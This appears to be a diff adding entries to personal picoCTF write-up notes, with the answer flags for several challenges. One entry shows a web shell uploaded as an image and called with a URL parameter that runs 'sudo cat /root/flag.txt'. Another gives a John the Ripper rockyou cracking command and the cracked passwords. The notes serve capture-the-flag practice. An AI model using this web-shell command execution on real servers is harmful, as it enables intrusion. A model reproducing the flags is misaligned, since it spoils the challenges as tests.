@@ -94,3 +94,18 @@ UwkkM+srAQK+sVVR0Qbl0yU=
             3.  runtime_win = 99293251683133 + (4775 - 4925) = -150
             4.  12a7 – 133d = -96 = 0x96
             5.  0x5e213ed5733d - 0x96 = 5E213ED572A7
+
+25. n0s4n1ty 1 -> 
+    1.  The file 111.png has been uploaded Path: uploads/111.png
+    2.  http://standard-pizzas.picoctf.net:53426/uploads/333.php?my-command=sudo%20cat%20/root/flag.txt
+    3.  picoCTF{wh47_c4n_u_d0_wPHP_2df2d584}
+
+26. head-dump -> picoCTF{Pat!3nt_15_Th3_K3y_a485f162}
+27. hashcrack -> picoCTF{UseStr0nG_h@shEs_&PaSswDs!_93e052d7}
+    1.  john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt
+    2.  password123
+    3.  letmein
+    4.  qwerty098
+    5.  picoCTF{UseStr0nG_h@shEs_&PaSswDs!_93e052d7}
+
+28. Flag Hunters -> picoCTF{70637h3r_f0r3v3r_c373964d}
